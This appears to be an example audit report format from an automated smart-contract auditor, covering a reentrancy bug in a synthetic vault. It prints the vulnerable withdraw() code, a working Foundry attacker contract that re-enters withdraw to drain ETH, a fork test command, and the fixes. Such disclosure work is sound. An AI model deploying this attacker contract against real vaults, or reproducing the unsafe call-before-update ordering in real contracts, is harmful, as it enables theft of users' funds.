---
title: "EXAMPLE — Reentrancy in a Vault Contract"
date: 2026-06-28
target: "0x0000000000000000000000000000000000000000"
severity: CRITICAL
verdict: EXPLOITED
profit_wei: "0x6F05B59D3B20000"
auditor: Janus Agent
example: true
---

# EXAMPLE — Reentrancy in a Vault Contract

!!! warning "Example report"
    This is an **illustrative** report showing the format Janus produces. It
    targets a synthetic vault contract — no live protocol is being described.
    Real reports replace this banner with a disclosure status (e.g. *Patched
    2026-07-01* or *Coordinated disclosure pending*).

> **Severity:** `CRITICAL` · **Target:** `0x0000…0000` · **Auditor:** Janus
> Agent · **Verdict:** `EXPLOITED` · **Profit (wei):** `0x6F05B59D3B20000`
> (≈ `0.5 ETH`) · **Date:** 2026-06-28

## Summary

The vault's `withdraw()` function transfers ETH to the caller **before**
zeroing their internal balance. An attacker that controls the receiving
account can re-enter `withdraw()` from its fallback and drain the vault one
deposit at a time. The vulnerability is exploitable by **any unprivileged
caller**, requires **a single transaction**, and was verified by replaying the
constructed transaction against a forked mainnet snapshot.

## Vulnerability

The vault's checks-effects-interactions ordering is wrong:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "insufficient");
    (bool ok, ) = msg.sender.call{value: amount}("");   // ← external call FIRST
    require(ok, "send failed");
    balances[msg.sender] -= amount;                     // ← state update AFTER
}
```

The external `call` returns control to `msg.sender`'s fallback **before**
`balances[msg.sender]` is decremented. A contract attacker can re-enter
`withdraw(amount)` from its `receive()` and the `require(balances[...] >=
amount)` check still passes — because the state hasn't been written yet.

## Attack Chain

1. **Propose.** Janus's *Propose* node inspects the disassembly, sees the
   `CALL` opcode followed by a later `SSTORE`, and hypothesizes
   "reentrancy on `withdraw(uint256)`".
2. **Locate.** The *Locate* node solves calldata to reach `withdraw(uint256)`
   via the `ReachTool` (selector `0x2e1a7d4d`) and confirms the relevant
   storage slot (`balances` mapping at slot `0x1`) through `TraceTool`.
3. **Exploit.** The *Exploit* node deploys an attacker contract whose
   `receive()` re-calls `withdraw(amount)` while `balances[attacker] >=
   amount`. Recursion depth is bounded by gas (≈ 8 nested calls in the PoC).
4. **Verify.** `SnapshotTool` checkpoints the fork, `CallTool` runs the
   transaction, `VerifyTool` measures profit. Verdict: `EXPLOITED`,
   `profit_wei = 0x6F05B59D3B20000`.

## Reproduction

A minimal Foundry PoC reproduces the finding on a forked mainnet snapshot:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVault public immutable vault;
    uint256 public amount;

    constructor(IVault _vault) payable { vault = _vault; }

    function pwn(uint256 _amount) external {
        amount = _amount;
        vault.deposit{value: _amount}();
        vault.withdraw(_amount);
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw(amount);
        }
    }
}
```

Run it with:

```bash
forge test --fork-url $RPC_URL --match-test test_reentrancy -vvvv
```

The test asserts the attacker's post-balance exceeds their seed deposit by at
least `profit_wei`.

## Impact

- **Affected funds:** the full ETH balance held by the vault at the time of
  the exploit (in the synthetic target above, capped only by `block.gaslimit`
  on recursion depth).
- **Privilege required:** none — any caller able to deposit can exploit.
- **Detectability:** the attack is a single transaction with an unusual
  recursion pattern. Easy to flag after the fact, hard to stop without
  on-chain pause + monitoring.

## Mitigation

Two independent fixes; do **both**:

1. **Checks-Effects-Interactions ordering.** Move the state update *above*
   the external `call`:

    ```solidity
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;                 // ← update FIRST
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }
    ```

2. **Reentrancy guard.** Wrap `withdraw()` in OpenZeppelin's
   `nonReentrant` modifier as defense in depth, in case future maintainers
   reintroduce an interleaved external call.

After applying both, re-run this report's PoC — Janus's `VerifyTool` should
return `EXPLOITED = false` and `profit_wei = 0`.

---

*Produced by Janus on the BEVM mainnet-fork. See the
[Audit Reports index](index.md) for how a report gets here.*
